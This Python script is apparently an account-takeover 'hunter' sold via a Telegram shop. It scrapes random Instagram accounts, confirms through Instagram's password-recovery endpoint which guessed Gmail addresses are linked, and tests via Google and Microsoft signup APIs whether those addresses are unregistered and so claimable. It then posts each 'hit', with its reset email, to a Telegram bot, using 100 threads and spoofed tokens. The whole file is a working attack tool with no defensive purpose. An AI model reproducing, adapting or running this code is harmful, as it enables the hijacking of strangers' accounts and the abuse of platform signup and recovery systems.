import requests
import random
import json, string
from threading import Thread
import os
from user_agent import *
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import re
import hashlib
import sys
import uuid
import datetime
import time
import webbrowser
try:
    from cfonts import render, say
except:
    os.system('pip install python-cfonts')
    exit(print('restart tool'))
webbrowser.open("https://t.me/nobi_shops")
NOBI = render('NOBI', colors=['white', 'cyan'], align='center')

print(f'''
{NOBI}

''')
tok = input('TOKEN : ')
idd =input(' ID : ')
os.system('clear')
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
aca = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
def amir():
    os.system('clear')
    output = (f"{cyan}▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n"
f"{cyan} {white} 𝗛𝗶𝘁𝘀: {green}{hits} \n"
f"{white} 𝐁𝐚𝐝 𝔦𝔫𝔰𝔱𝔞: {red}{badinsta} \n"
f"{white} 𝐁𝐚𝐝 𝔢𝔴𝔞𝔦𝔩𝔩: {yellow}{bademail} \n"
f"{white} 𝐆𝐨𝐨𝐝 IG: {orange}{goodig} {cyan}\n"

f"{white} DEV ; @nobi_shops  {cyan}"

  f"{cyan}▱▱▱▱▱▱▱▱▱▱▱▱\n"
              f"\r")
    sys.stdout.write(output)
    sys.stdout.flush()

a = print(f"""                            
{cyan}| -> 𝟭. -  𝟮𝟬𝟭𝟰 - 𝟮𝟬𝟭𝟱

{cyan}| -> 𝟮. -   𝟮𝟬𝟭𝟱 - 𝟮𝟬𝟭𝟲

{cyan}| -> 𝟯 - 𝟮𝟬𝟭𝟬 - 𝟮𝟬𝟭𝟵

""")
NOBI = input(f"{white} Sec dost {reset}")

if NOBI == '1':
    bbk = 900990001
    id = 4959563
elif NOBI == '2':
    bbk = 1900000000
    id = 2500000000
elif NOBI == '3':
    bbk = 10000
    id = 5872671
else:
    exit()  
os.system('clear') 

while True:
    try:
        res = requests.get('https://signup.live.com/signup')
        amsc = res.cookies.get_dict().get('amsc')
        canary = res.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
        cookies = {
            'amsc': amsc,
        }
        headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'canary': canary,
            'origin': 'https://signup.live.com',
            'referer': 'https://signup.live.com/signup?lic=1&uaid=f26d1e8726944e3f9cc96aafdfdf8225',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'clientExperiments': [
                {
                    'parallax': 'enablejspublickeydeprecationexperiment',
                    'control': 'enablejspublickeydeprecationexperiment_control',
                    'treatments': [
                        'enablejspublickeydeprecationexperiment_treatment',
                    ],
                },
            ],
        }

        response = requests.post(
            'https://signup.live.com/API/EvaluateExperimentAssignments',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).json()
        canary = response['apiCanary']
        break
    except:
        pass

while True:
    try:
        a = "https://www.instagram.com/accounts/login"
        session = requests.Session()
        aa = session.get(a)
        csrf = aa.cookies.get('csrftoken')
        break
    except:
        pass

yy = 'azertyuiopmlkjhgfdsqwxcvbn'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def check_gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}',
            'user-agent': ggb(),
        }

        params = {'TL': tl}
        data = (
            '=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            amir()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          amir()
    except:''

def hotmail(email):
    global hits, bademail
    cookies = {
        'amsc': amsc,
    }

    headers = {
        'canary': canary,
        'origin': 'https://signup.live.com',
        'referer': 'https://signup.live.com/signup?lic=1&uaid=3daaf5bf6b70499d8a5035844d5bbfd8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'signInName': email,
    }

    response = requests.post(
        'https://signup.live.com/API/CheckAvailableSigninNames',
        cookies=cookies,
        headers=headers,
        json=json_data,
    ).text

    if '"isAvailable":true' in response:
        hits += 1
        amir()
        username, gg = email.split('@')
        InfoAcc(username, gg)
    else:
        bademail += 1
        amir()

def check(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
    if email in response:
        if '@gmail.com' in email:
            check_gmail(email)
        goodig += 1
        amir()
    else:
        badinsta += 1
        amir()

def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='reset bulunamadi '
  return r

def date(hy):
    try:
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019)
        ]

        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023

    except Exception:
        pass


def InfoAcc(username, gg):
    global aca
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://storiesig.info',
        'priority': 'u=1, i',
        'referer': 'https://storiesig.info/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': str(generate_user_agent()),
    }

    try:
        rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
    except Exception as e:
        rrr = {}

    Id = rrr.get('result', {}).get('user', {}).get('pk', 'none')
    fows = rrr.get('result', {}).get('user', {}).get('follower_count', 'none')
    fowg = rrr.get('result', {}).get('user', {}).get('following_count', 'none')
    pp = rrr.get('result', {}).get('user', {}).get('media_count', 'none')

    try:
        hy = int(Id) if Id != 'none' else None
        datte = date(hy) if hy else 'none'
    except:
        datte = 'none'

    aca += 1
    tlg = f'''
 𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇  
═══════════════════════════════  
𝐌𝐞𝐭𝐚 : {aca}  
Username : {username}  
𝐄-𝐦𝐚𝐢𝐥 : {username}@{gg}  
 𝐑𝐞𝐬𝐞𝐭 : {rest(username)}  
═════════════════════════════
 🪩 by : @nobi_shops - 
'''

    with open('Onurhits.txt', 'a') as ff:
        ff.write(f'{tlg}\n')

    try:
        try:requests.get(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={idd}&text={tlg}")
        except:pass
    except Exception as e:
        pass

def gg():
    while True:
        data = {
            "lsd": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "variables": json.dumps({"id": int(random.randrange(bbk, id)), "render_surface": "PROFILE"}),
            "doc_id": "25618261841150840"
        }

        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": data["lsd"]},
            data=data
        )
        try:
            username = response.json().get('data', {}).get('user', {}).get('username')
            emails = [username + '@gmail.com']
            for email in emails:
                check(email)
        except:''
for _ in range(100):
    Thread(target=gg).start()

    
